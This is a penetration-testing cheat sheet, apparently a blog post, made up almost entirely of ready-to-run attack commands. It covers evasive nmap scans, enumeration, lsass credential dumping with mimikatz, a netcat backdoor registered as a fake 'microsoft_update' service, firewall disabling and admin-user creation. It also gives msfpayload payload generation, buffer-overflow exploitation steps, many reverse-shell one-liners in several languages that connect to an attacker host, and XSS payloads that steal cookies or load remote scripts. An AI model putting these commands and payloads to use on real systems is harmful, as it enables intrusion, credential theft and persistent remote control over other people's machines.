**Nmap Full Web Vulnerable Scan:    
**

mkdir /usr/share/nmap/scripts/vulscan

cd /usr/share/nmap/scrripts/vulscan

wget [http://www.computec.ch/projekte/vulscan/download/nmap\_nse\_vulscan-2.0.tar.gz](http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz) && tar xzf nmap\_nse\_vulscan-2.0.tar.gz

nmap -sS -sV –script=vulscan/vulscan.nse target

nmap -sS -sV –script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target

nmap -sS -sV –script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target

nmap -PN -sS -sV –script=vulscan –script-args vulscancorrelation=1 -p80 target

nmap -sV –script=vuln target

nmap -PN -sS -sV –script=all –script-args vulscancorrelation=1 target

**Dirb Directory Bruteforce:**

dirb [http://IP:PORT](http://IP:PORT) dirbuster-ng-master/wordlists/common.txt

**Nikto Scanner:    
**

nikto -C all -h [http://IP](http://IP)

**WordPress Scanner:    
**

wpscan –url [http://IP/](http://IP/) –enumerate p

**Uniscan Scanning:    
**

uniscan.pl -u target -qweds

**HTTP Enumeration:**

httprint -h [http://www.example.com](http://www.example.com) -s signatures.txt

**SKIP Fish Scanner:    
**

skipfish -m 5 -LVY -W /usr/share/skipfish/dictionaries/complete.wl -u [http://IP](http://IP)

**Uniscan Scanning:    
**

uniscan –u [http://www.hubbardbrook.org](http://www.hubbardbrook.org) –qweds

Here, -q – Enable Directory checks

-w – Enable File Checks

-e – Enable robots.txt and sitemap.xml check

-d – Enable Dynamic checks

-s – Enable Static checks

**Skipfish Scanning:    
**

m-time threads -LVY donot update after result

skipfish -m 5 -LVY -W /usr/share/skipfish/dictionaries/complete.wl -u [http://IP](http://IP)

**Nmap Ports Scan:    
**

1\)decoy- masqurade nmap -D RND:10 \[target\] \(Generates a random number of decoys\)

1\)decoy- masqurade nmap -D RND:10 \[target\] \(Generates a random number of decoys\)

2\)fargement

3\)data packed – like orginal one not scan packet

4\)use auxiliary/scanner/ip/ipidseq for find zombie ip in network to use them to scan — nmap -sI ip target

5\) nmap –source-port 53 target

nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target \( Randomize scan form diff IP\)

nmap -Pn -T2 -sV –randomize-hosts IP1,IP2

nmap –script smb-check-vulns.nse -p445 target \(using NSE scripts\)

nmap -sU -P0 -T Aggressive -p123 target \(Aggresive Scan T1-T5\)

nmap -sA -PN -sN target

nmap -sS -sV -T5 -F -A -O target \(version detection\)

nmap -sU -v target \(Udp\)

nmap -sU -P0 \(Udp\)

nmap -sC 192.168.31.10-12 \(all scan default\)

**Netcat Scanning:    
**

nc -v -w 1 target -z 1-1000

for i in {10..12}; do nc -vv -n -w 1 192.168.34.$i 21-25 -z; done

**US Scanning:    
**

us -H -msf -Iv 192.168.31.20 -p 1-65535 && us -H -mU -Iv 192.168.31.20 -p 1-65535

**Unicornscan Scanning:    
**

unicornscan X.X.X.X:a -r10000 -v

**Kernel Scanning:**

xprobe2 -v -p tcp:80:open 192.168.6.66

**Samba Enumeartion:    
**

nmblookup -A target

smbclient //MOUNT/share -I target -N

rpcclient -U “” target

enum4linux target

**SNMP Enumeration:    
**

snmpget -v 1 -c public IP version

snmpwalk -v 1 -c public IP

snmpbulkwalk -v 2 -c public IP

**Windows Useful commands:**

net localgroup Users

net localgroup Administrators

search dir/s \*.doc

system\(“start cmd.exe /k $cmd”\)

sc create microsoft\_update binpath=”cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe” start= auto error= ignore

/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779

mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”

Procdump.exe -accepteula -ma lsass.exe lsass.dmp

mimikatz.exe “sekurlsa::minidump lsass.dmp” “log” “sekurlsa::logonpasswords”

C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits

C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits

**Plink Tunnel**:

plink.exe -P 22 -l root -pw “1234” -R 445:127.0.0.1:445 X.X.X.X

**Enable RDP Access:**

reg add “hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG\_DWORD /d 0

netsh firewall set service remoteadmin enable

netsh firewall set service remotedesktop enable

**Turn Off Firewall:**

netsh firewall set opmode disable

**Meterpreter:**

run getgui -u admin -p 1234

run vnc -p 5043

**Add User Windows:**

net user test 1234 /add

net localgroup administrators test /add

**Mimikatz:**

privilege::debug

sekurlsa::logonPasswords full

Passing the Hash:

pth-winexe -U hash //IP cmd

Password Cracking using Hashcat:

hashcat -m 400 -a 0 hash /root/rockyou.txt

**Netcat commands:**

c:&gt; nc -l -p 31337

\#nc 192.168.0.10 31337

c:&gt; nc -v -w 30 -p 31337 -l &lt; secret.txt

\#nc -v -w 2 192.168.0.10 31337 &gt; secret.txt

**Banner Grabbing:**

nc 192.168.0.10 80

GET / HTTP/1.1

Host: 192.168.0.10

User-Agent: SPOOFED-BROWSER

Referrer: K0NSP1RACY.COM

&lt;enter&gt;

&lt;enter&gt;

**window reverse shell:**

c:&gt;nc -Lp 31337 -vv -e cmd.exe

nc 192.168.0.10 31337

c:&gt;nc rogue.k0nsp1racy.com 80 -e cmd.exe

nc -lp 80

\#nc -lp 31337 -e /bin/bash

nc 192.168.0.11 31337

nc -vv -r\(random\) -w\(wait\) 1 192.168.0.10 -z\(i/o error\) 1-1000

**Find all SUID root files:**

find / -user root -perm -4000 -print

**Find all SGID root files:**

find / -group root -perm -2000 -print

Find all SUID and SGID files owned by anyone:

find / -perm -4000 -o -perm -2000 -print

**Find all files that are not owned by any user:**

find / -nouser -print

**Find all files that are not owned by any group:**

find / -nogroup -print

**Find all symlinks and what they point to:**

find / -type l -ls

**Python:**

python -c ‘import pty;pty.spawn\(“/bin/bash”\)’

python -m SimpleHTTPServer \(Starting HTTP Server\)

**PID:**

fuser -nv tcp 80 \(list PID of process\)

fuser -k -n tcp 80 \(Kill Process of PID\)

**Hydra:**

hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp \(Self Explanatory\)

**Mount Remote Windows Share**:

smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw

**Compiling Exploit in Kali:**

gcc -m32 -o output32 hello.c \(32 bit\)

gcc -o output hello.c \(64 bit\)

Compiling Windows Exploits on Kali:

cd /root/.wine/drive\_c/MinGW/bin

wine gcc -o ability.exe /tmp/exploit.c -lwsock32

wine ability.exe

**NASM Command:**

nasm -f bin -o payload.bin payload.asm

nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload

**SSH Pivoting:**

ssh -D 127.0.0.1:1080 -p 22 user@IP

Add socks4 127.0.0.1 1080 in /etc/proxychains.conf

proxychains commands target

**Pivoting to One Network to Another:**

ssh -D 127.0.0.1:1080 -p 22 user1@IP1

Add socks4 127.0.0.1 1080 in /etc/proxychains.conf

proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2

Add socks4 127.0.0.1 1081 in /etc/proxychains.conf

proxychains commands target

**Pivoting Using metasploit:**

route add 10.1.1.0 255.255.255.0 1

route add 10.2.2.0 255.255.255.0 1

use auxiliary/server/socks4a

run

proxychains msfcli windows/\* PAYLOAD=windows/meterpreter/reverse\_tcp LHOST=IP LPORT=443 RHOST=IP E

**Exploit-DB search using CSV File:**

searchsploit-rb –update

searchsploit-rb -t webapps -s WEBAPP

searchsploit-rb –search=”Linux Kernel”

searchsploit-rb -a “author name” -s “exploit name”

searchsploit-rb -t remote -s “exploit name”

searchsploit-rb -p linux -t local -s “exploit name”

**For Privilege Escalation Exploit search:**

cat files.csv \| grep -i linux \| grep -i kernel \| grep -i local \| grep -v dos \| uniq \| grep 2.6 \| egrep “&lt;\|&lt;=” \| sort -k3

**Metasploit Payloads:**

msfpayload windows/meterpreter/reverse\_tcp LHOST=10.10.10.10 X &gt; system.exe

msfpayload php/meterpreter/reverse\_tcp LHOST=10.10.10.10 LPORT=443 R &gt; exploit.php

msfpayload windows/meterpreter/reverse\_tcp LHOST=10.10.10.10 LPORT=443 R \| msfencode -t asp -o file.asp

msfpayload windows/meterpreter/reverse\_tcp LHOST=X.X.X.X LPORT=443 R \| msfencode -e x86/shikata\_ga\_nai -b “\x00″ -t c

Create a Linux Reverse Meterpreter Binary

msfpayload linux/x86/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; R \| msfencode -t elf -o shell

Create Reverse Shell \(Shellcode\)

msfpayload windows/shell\_reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; R \| msfencode -b “\x00\x0a\x0d”

Create a Reverse Shell Python Script

msfpayload cmd/unix/reverse\_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; R &gt; shell.py

Create a Reverse ASP Shell

msfpayload windows/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; R \| msfencode -t asp -o shell.asp

Create a Reverse Bash Shell

msfpayload cmd/unix/reverse\_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; R &gt; shell.sh

Create a Reverse PHP Shell

msfpayload php/meterpreter\_reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; R &gt; shell.php

Edit shell.php in a text editor to add &lt;?php at the beginning.

Create a Windows Reverse Meterpreter Binary

msfpayload windows/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; X &gt;shell.exe

**Security Commands In Linux:**

find programs with a set uid bit

\# find / -uid 0 -perm -4000

find things that are world writable

\# find / -perm -o=w

find names with dots and spaces, there shouldn’t be any

\# find / -name ” ” -print

\# find / -name “..” -print

\# find / -name “. ” -print

\# find / -name ” ” -print

find files that are not owned by anyone

\# find / -nouser

look for files that are unlinked

\# lsof +L1

get information about procceses with open ports

\# lsof -i

look for weird things in arp

\# arp -a

look at all accounts including AD

\# getent passwd

look at all groups and membership including AD

\# getent group

list crontabs for all users including AD

\# for user in $\(getent passwd\|cut -f1 -d:\); do echo “\#\#\# Crontabs for $user \#\#\#\#”; crontab -u $user -l; done

\#generate random passwords

cat /dev/urandom\| tr -dc ‘a-zA-Z0-9-\_!@\#$%^&\*\(\)\_+{}\|:&lt;&gt;?=’\|fold -w 12\| head -n 4

\# find all immutable files, there should not be any

find . \| xargs -I file lsattr -a file 2&gt;/dev/null \| grep ‘^….i’

\# fix immutable files

chattr -i file

Windows Buffer Overflow Exploitation Commands:

msfpayload windows/shell\_bind\_tcp R \| msfencode -a x86 -b “\x00″ -t c

msfpayload windows/meterpreter/reverse\_tcp LHOST=X.X.X.X LPORT=443 R \| msfencode -e x86/shikata\_ga\_nai -b “\x00″ -t c

COMMONLY USED BAD CHARACTERS:

\x00\x0a\x0d\x20                                            For http request

\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with \(0\n\r\_\)

Useful Commands:

pattern create

pattern offset \(EIP Address\)

pattern offset \(ESP Address\)

add garbage upto EIP value and add \(JMP ESP address\) in EIP . \(ESP = shellcode \)

!pvefindaddr pattern\_create 5000

!pvefindaddr suggest

!pvefindaddr modules

!pvefindaddr nosafeseh

!mona config -set workingfolder C:\Mona\%p

!mona config -get workingfolder

!mona mod

!mona bytearray -b “\x00\x0a”

!mona pc 5000

!mona po EIP

!mona suggest

**SEH:**

!mona suggest

!mona nosafeseh

nseh=”\xeb\x06\x90\x90″ \(next seh chain\)

iseh= !pvefindaddr p1 -n -o -i \(POP POP RETRUN or POPr32,POPr32,RETN\)

**ROP \(DEP\):**

!mona modules

!mona ropfunc -m \*.dll -cpb “\x00\x09\x0a’

!mona rop -m \*.dll -cpb “\x00\x09\x0a’ \(auto suggest\)

**ASLR:**

!mona noaslr

EGG Hunter:

!mona jmp -r esp

!mona egg -t lxxl

\xeb\xc4 \(jump backward -60\)

buff=lxxllxxl+shell

!mona egg -t ‘w00t’

GDB Debugger Commands:

**Setting Breakpoint :**

break \*\_start

Execute Next Instruction :

next

step

n

s

**Continue Execution :**

continue

c

**Data :**

checking ‘REGISTERS’ and ‘MEMORY’

Display Register Values : \(Decimal , Binary , Hex \)

print /d –&gt; Decimal

print /t –&gt; Binary

print /x –&gt; Hex

O/P :

\(gdb\) print /d $eax

$17 = 13

\(gdb\) print /t $eax

$18 = 1101

\(gdb\) print /x $eax

$19 = 0xd

\(gdb\)

Display values of specific memory locations :

command : x/nyz \(Examine\)

n –&gt; Number of fields to display ==&gt;

y –&gt; Format for output ==&gt; c \(character\) , d \(decimal\) , x \(Hexadecimal\)

z –&gt; Size of field to be displayed ==&gt; b \(byte\) , h \(halfword\), w \(word 32 Bit\)

**Cheat Codes:**

**Reverse Shellcode:**

**BASH:**

bash -i &gt;& /dev/tcp/192.168.23.10/443 0&gt;&1

exec /bin/bash 0&0 2&gt;&0

exec /bin/bash 0&0 2&gt;&0

0&lt;&196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&196 &gt;&196 2&gt;&196

0&lt;&196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&196 &gt;&196 2&gt;&196

exec 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&5 \| while read line; do $line 2&gt;&5 &gt;&5; done \# or: while read line 0&lt;&5; do $line 2&gt;&5 &gt;&5; done

exec 5&lt;&gt;/dev/tcp/attackerip/4444

cat &lt;&5 \| while read line; do $line 2&gt;&5 &gt;&5; done \# or:

while read line 0&lt;&5; do $line 2&gt;&5 &gt;&5; done

/bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;&1 2&gt;&1

/bin/bash -i &gt; /dev/tcp/192.168.23.10/443 0&lt;&1 2&gt;&1

**PERL:  
**

Shorter Perl reverse shell that does not depend on /bin/sh:

perl -MIO -e ‘$p=fork;exit,if\($p\);$c=new IO::Socket::INET\(PeerAddr,”attackerip:4444″\);STDIN-&gt;fdopen\($c,r\);$~-&gt;fdopen\($c,w\);system$\_ while&lt;&gt;;’

perl -MIO -e ‘$p=fork;exit,if\($p\);$c=new IO::Socket::INET\(PeerAddr,”attackerip:4444″\);STDIN-&gt;fdopen\($c,r\);$~-&gt;fdopen\($c,w\);system$\_ while&lt;&gt;;’

If the target system is running Windows use the following one-liner:

perl -MIO -e ‘$c=new IO::Socket::INET\(PeerAddr,”attackerip:4444″\);STDIN-&gt;fdopen\($c,r\);$~-&gt;fdopen\($c,w\);system$\_ while&lt;&gt;;’

perl -MIO -e ‘$c=new IO::Socket::INET\(PeerAddr,”attackerip:4444″\);STDIN-&gt;fdopen\($c,r\);$~-&gt;fdopen\($c,w\);system$\_ while&lt;&gt;;’

perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket\(S,PF\_INET,SOCK\_STREAM,getprotobyname\(“tcp”\)\);if\(connect\(S,sockaddr\_in\($p,inet\_aton\($i\)\)\)\){open\(STDIN,”&gt;&S”\);open\(STDOUT,”&gt;&S”\);open\(STDERR,”&gt;&S”\);exec\(“/bin/sh -i”\);};’

perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket\(S,PF\_INET,SOCK\_STREAM,getprotobyname\(“tcp”\)\);if\(connect\(S,sockaddr\_in\($p,inet\_aton\($i\)\)\)\){open\(STDIN,”&gt;&S”\);open\(STDOUT,”&gt;&S”\);open\(STDERR,”&gt;&S”\);exec\(“/bin/sh -i”\);};’

**RUBY:  
**

Longer Ruby reverse shell that does not depend on /bin/sh:

ruby -rsocket -e ‘exit if fork;c=TCPSocket.new\(“attackerip”,”4444″\);while\(cmd=c.gets\);IO.popen\(cmd,”r”\){\|io\|c.printio.read}end’

ruby -rsocket -e ‘exit if fork;c=TCPSocket.new\(“attackerip”,”4444″\);while\(cmd=c.gets\);IO.popen\(cmd,”r”\){\|io\|c.printio.read}end’

If the target system is running Windows use the following one-liner:

ruby -rsocket -e ‘c=TCPSocket.new\(“attackerip”,”4444″\);while\(cmd=c.gets\);IO.popen\(cmd,”r”\){\|io\|c.print io.read}end’

ruby -rsocket -e ‘c=TCPSocket.new\(“attackerip”,”4444″\);while\(cmd=c.gets\);IO.popen\(cmd,”r”\){\|io\|c.print io.read}end’

ruby -rsocket -e’f=TCPSocket.open\(“attackerip”,1234\).to\_i;exec sprintf\(“/bin/sh -i &lt;&%d &gt;&%d 2&gt;&%d”,f,f,f\)’

ruby -rsocket -e’f=TCPSocket.open\(“attackerip”,1234\).to\_i;exec sprintf\(“/bin/sh -i &lt;&%d &gt;&%d 2&gt;&%d”,f,f,f\)’

**PYTHON:  
**

python -c ‘import socket,subprocess,os;s=socket.socket\(socket.AF\_INET,socket.SOCK\_STREAM\);s.connect\(\(“10.0.0.1″,1234\)\);os.dup2\(s.fileno\(\),0\);os.dup2\(s.fileno\(\),1\); os.dup2\(s.fileno\(\),2\);p=subprocess.call\(\[“/bin/sh”,”-i”\]\);’

python -c ‘import socket,subprocess,os;s=socket.socket\(socket.AF\_INET,socket.SOCK\_STREAM\);s.connect\(\(“10.0.0.1″,1234\)\);os.dup2\(s.fileno\(\),0\);os.dup2\(s.fileno\(\),1\); os.dup2\(s.fileno\(\),2\);p=subprocess.call\(\[“/bin/sh”,”-i”\]\);’

**PHP:  
**

This code assumes that the TCP connection uses file descriptor 3.

php -r ‘$sock=fsockopen\(“10.0.0.1″,1234\);exec\(“/bin/sh -i &lt;&3 &gt;&3 2&gt;&3″\);’

php -r ‘$sock=fsockopen\(“10.0.0.1″,1234\);exec\(“/bin/sh -i &lt;&3 &gt;&3 2&gt;&3″\);’

If you would like a PHP reverse shell to download, try this link on pentestmonkey.net -&gt; LINK

**NETCAT:  
**

Other possible Netcat reverse shells, depending on the Netcat version and compilation flags:

nc -e /bin/sh attackerip 4444

nc -e /bin/sh 192.168.37.10 443

If the -e option is disabled, try this

mknod backpipe p && nc 192.168.23.10 443 0&lt;backpipe \| /bin/bash 1&gt;backpipe

mknod backpipe p && nc attackerip 8080 0&lt;backpipe \| /bin/bash 1&gt;backpipe

/bin/sh \| nc attackerip 4444

/bin/sh \| nc 192.168.23.10 443

rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/

rm -f /tmp/p; mknod /tmp/p p && nc 192.168.23.10 444 0/tmp/

If you have the wrong version of netcat installed, try

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2&gt;&1\|nc 192.168.23.10 &gt;/tmp/f

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2&gt;&1\|nc 10.0.0.1 1234 &gt;/tmp/f

**TELNET:  
**

If netcat is not available or /dev/tcp

mknod backpipe p && telnet attackerip 8080 0&lt;backpipe \| /bin/bash 1&gt;backpipe

mknod backpipe p && telnet attackerip 8080 0&lt;backpipe \| /bin/bash 1&gt;backpipe

**XTERM:  
**

Xterm is the best..

To catch incoming xterm, start an open X Server on your system \(:1 – which listens on TCP port 6001\). One way to do this is with Xnest: It is available on Ubuntu.

Xnest :1 \# Note: The command starts with uppercase X

Xnest :1 \# Note: The command starts with uppercase X

Then remember to authorise on your system the target IP to connect to you:

xterm -display 127.0.0.1:1 \# Run this OUTSIDE the Xnest, another tab xhost +targetip \# Run this INSIDE the spawned xterm on the open X Server

xterm -display 127.0.0.1:1 \# Run this OUTSIDE the Xnest, another tab

xhost +targetip \# Run this INSIDE the spawned xterm on the open X Server

If you want anyone to connect to this spawned xterm try:

xhost + \# Run this INSIDE the spawned xterm on the open X Server

xhost + \# Run this INSIDE the spawned xterm on the open X Server

Then on the target, assuming that xterm is installed, connect back to the open X Server on your system:

xterm -display attackerip:1

xterm -display attackerip:1

Or:

$ DISPLAY=attackerip:0 xterm

$ DISPLAY=attackerip:0 xterm

It will try to connect back to you, attackerip, on TCP port 6001.

Note that on Solaris xterm path is usually not within the PATH environment variable, you need to specify its filepath:

/usr/openwin/bin/xterm -display attackerip:1

/usr/openwin/bin/xterm -display attackerip:1

**PHP:  
**

php -r ‘$sock=fsockopen\(“192.168.0.100″,4444\);exec\(“/bin/sh -i &lt;&3 &gt;&3 2&gt;&3″\);’

**JAVA:  
**

r = Runtime.getRuntime\(\)

p = r.exec\(\[“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.0.100/4444;cat &lt;&5 \| while read line; do $line 2&gt;&5 &gt;&5; done”\] as String\[\]\)

p.waitFor\(\)

XSS Cheat Codes:

\(“&lt; iframes &gt;  src=[http://IP:PORT](http://IP:PORT) &lt;/ iframes &gt;”\)

&lt;script&gt;document.location=[http://IP:PORT&lt;/script&gt](http://IP:PORT</script&gt);

‘;alert\(String.fromCharCode\(88,83,83\)\)//\';alert\(String.fromCharCode\(88,83,83\)\)//”;alert\(String.fromCharCode\(88,83,83\)\)//\”;alert\(String.fromCharCode\(88,83,83\)\)//–&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert\(String.fromCharCode\(88,83,83\)\)&lt;/SCRIPT&gt;

”;!–“&lt;XSS&gt;=&amp;{\(\)}

&lt;IMG SRC=”javascript:alert\(‘XSS’\);”&gt;

&lt;IMG SRC=javascript:alert\(‘XSS’\)&gt;

&lt;IMG “””&gt;&lt;SCRIPT&gt;alert\(“XSS”\)&lt;/SCRIPT&gt;”&gt;

&lt;IMG SRC=&amp;\#106;&amp;\#97;&amp;\#118;&amp;\#97;&amp;\#115;&amp;\#99;&amp;\#114;&amp;\#105;&amp;\#112;&amp;\#116;&amp;\#58;&amp;\#97;&amp;\#108;&amp;\#101;&amp;\#114;&amp;\#116;&amp;\#40;&amp;\#39;&amp;\#88;&amp;\#83;&amp;\#83;&amp;\#39;&amp;\#41;&gt;

&lt;IMG SRC=&amp;\#0000106&amp;\#0000097&amp;\#0000118&amp;\#0000097&amp;\#0000115&amp;\#0000099&amp;\#0000114&amp;\#0000105&amp;\#0000112&amp;\#0000116&amp;\#0000058&amp;\#0000097&amp;\#0000108&amp;\#0000101&amp;\#0000114&amp;\#0000116&amp;\#0000040&amp;\#0000039&amp;\#0000088&amp;\#0000083&amp;\#0000083&amp;\#0000039&amp;\#0000041&gt;

&lt;IMG SRC=”jav ascript:alert\(‘XSS’\);”&gt;

perl -e ‘print “&lt;IMG SRC=javascript:alert\(\”XSS\”\)&gt;”;’ &gt; out

&lt;BODY onload!\#$%&\(\)\*~+-\_.,:;?@\[/\|\\]^\`=alert\(“XSS”\)&gt;

\( “&gt;&lt; iframes [http://google.de](http://google.de) &lt; iframes &gt;\)

&lt;BODY BACKGROUND=”javascript:alert\(‘XSS’\)”&gt;

&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert\(‘XSS’\);”&gt;&lt;/FRAMESET&gt;

“&gt;&lt;script &gt;alert\(document.cookie\)&lt;/script&gt;

%253cscript%253ealert\(document.cookie\)%253c/script%253e

“&gt;&lt;s”%2b”cript&gt;alert\(document.cookie\)&lt;/script&gt;

%22/%3E%3CBODY%20onload=’document.write\(%22%3Cs%22%2b%22cript%20src=[http://my.box.com/xss.js&gt;&lt;/script&gt;"\)’&gt;](http://my.box.com/xss.js></script>"%29’>)

&lt;img src=asdf onerror=alert\(document.cookie\)&gt;

Useful Links To Read and Learn:

Enumeration:

[http://www.0daysecurity.com/penetration-testing/enumeration.html](http://www.0daysecurity.com/penetration-testing/enumeration.html)

Windows Shellcode:

[http://farlight.org/index.html?type=shellcode](http://farlight.org/index.html?type=shellcode)

[http://shell-storm.org/shellcode/](http://shell-storm.org/shellcode/)

[http://www.windowsexploits.com/](http://www.windowsexploits.com/)

**XSS Cheat Codes:  
**

[http://www.xenuser.org/xss-cheat-sheet/](http://www.xenuser.org/xss-cheat-sheet/)

[https://gist.github.com/sseffa/11031135](https://gist.github.com/sseffa/11031135)

[https://html5sec.org/](https://html5sec.org/)

Reverse Shell Cheat Codes:

[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

[http://roo7break.co.uk/?p=215](http://roo7break.co.uk/?p=215)

**Webshells:  
**

[http://www.r57shell.net/](http://www.r57shell.net/)

**Nikto Tutorial:  
**

[http://www.unixmen.com/install-nikto-web-scanner-check-vulnerabilities/](http://www.unixmen.com/install-nikto-web-scanner-check-vulnerabilities/)

**Exploit-db:  
**

wget [http://exploit-db.com/archive.tar.bz2](http://exploit-db.com/archive.tar.bz2)

**SNMP Enumeration:**

[http://www.webpronews.com/snmp-enumeration-and-hacking-2003-09](http://www.webpronews.com/snmp-enumeration-and-hacking-2003-09)

[http://carnal0wnage.attackresearch.com/2007/07/over-in-lso-chat-we-were-talking-about.html](http://carnal0wnage.attackresearch.com/2007/07/over-in-lso-chat-we-were-talking-about.html)

**SAMBA Enumeration:  
**

[http://www.iodigitalsec.com/windows-null-session-enumeration/](http://www.iodigitalsec.com/windows-null-session-enumeration/)

[http://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions](http://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions)

[http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html](http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html)

[http://www.madirish.net/59](http://www.madirish.net/59)

**Passhing The Hash:  
**

[https://www.kali.org/penetration-testing/passing-hash-remote-desktop/](https://www.kali.org/penetration-testing/passing-hash-remote-desktop/)

[https://www.kali.org/kali-monday/pass-the-hash-toolkit-winexe-updates/](https://www.kali.org/kali-monday/pass-the-hash-toolkit-winexe-updates/)

**Hashcat Tutorial:  
**

[http://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-3-using-hashcat-0156543/](http://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-3-using-hashcat-0156543/)

**Wordlist Download:  
**

[https://wiki.skullsecurity.org/Passwords](https://wiki.skullsecurity.org/Passwords)

[http://hqsoftwarecollection.blogspot.in/p/36gn-wordlist.html](http://hqsoftwarecollection.blogspot.in/p/36gn-wordlist.html)

**NASM Tutorial:  
**

[http://en.kioskea.net/faq/1559-compiling-an-assembly-program-with-nasm](http://en.kioskea.net/faq/1559-compiling-an-assembly-program-with-nasm)

**Buffer overflow Tutorial:  
**

I consider this as intermediate and focus more on the real application exploit. Lupin from The Grey Corner explains exploit from basic to intermediate level with step by step debugging.

Stack Based Windows Buffer Overflow Tutorial – [http://grey-corner.blogspot.com/2010/01/beginning-stack-based-buffer-overflow.html](http://grey-corner.blogspot.com/2010/01/beginning-stack-based-buffer-overflow.html)

SEH Stack Based Windows Buffer Overflow Tutorial – [http://grey-corner.blogspot.com/2010/01/seh-stack-based-windows-buffer-overflow.html](http://grey-corner.blogspot.com/2010/01/seh-stack-based-windows-buffer-overflow.html)

Windows Buffer Overflow Tutorial: Dealing with Character Translation – [http://grey-corner.blogspot.com/2010/01/windows-buffer-overflow-tutorial.html](http://grey-corner.blogspot.com/2010/01/windows-buffer-overflow-tutorial.html)

Heap Spray Exploit Tutorial: Internet Explorer Use After Free Aurora Vulnerability – [http://grey-corner.blogspot.com/2010/01/heap-spray-exploit-tutorial-internet.html](http://grey-corner.blogspot.com/2010/01/heap-spray-exploit-tutorial-internet.html)

Windows Buffer Overflow Tutorial: An Egghunter and a Conditional Jump – [http://grey-corner.blogspot.com/2010/02/windows-buffer-overflow-tutorial.html](http://grey-corner.blogspot.com/2010/02/windows-buffer-overflow-tutorial.html)

**ADVANCED:  
**

Peter Van Eeckhoutte is the first one who started this exploit tutorial \(at least he is the first one who has provided most comprehensive guides on exploit development and keeps updating from time to time that I have ever seen\).

Exploit writting tutorial part 1:Stack Based Overflows –[http://www.corelan.be:8800/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/](http://www.corelan.be:8800/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)

Exploit writting tutorial part 2: Stack Based Overflows – jumping to shellcode –[http://www.corelan.be:8800/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/](http://www.corelan.be:8800/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/)

Exploit writting tutorial part 3: SEH Based Exploits –[http://www.corelan.be:8800/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/](http://www.corelan.be:8800/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/)

Exploit writting tutorial part 3b: SEH Based Exploits – just another example –[http://www.corelan.be:8800/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/](http://www.corelan.be:8800/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/)

Exploit writting tutorial part 4: From Exploit to Metasploit – The basics –[http://www.corelan.be:8800/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/](http://www.corelan.be:8800/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/)

Exploit writting tutorial part 5: How debugger modules & plugins can speed up basic exploit development – [http://www.corelan.be:8800/index.php/2009/09/05/exploit-writing-tutorial-part-5-how-debugger-modules-plugins-can-speed-up-basic-exploit-development/](http://www.corelan.be:8800/index.php/2009/09/05/exploit-writing-tutorial-part-5-how-debugger-modules-plugins-can-speed-up-basic-exploit-development/)

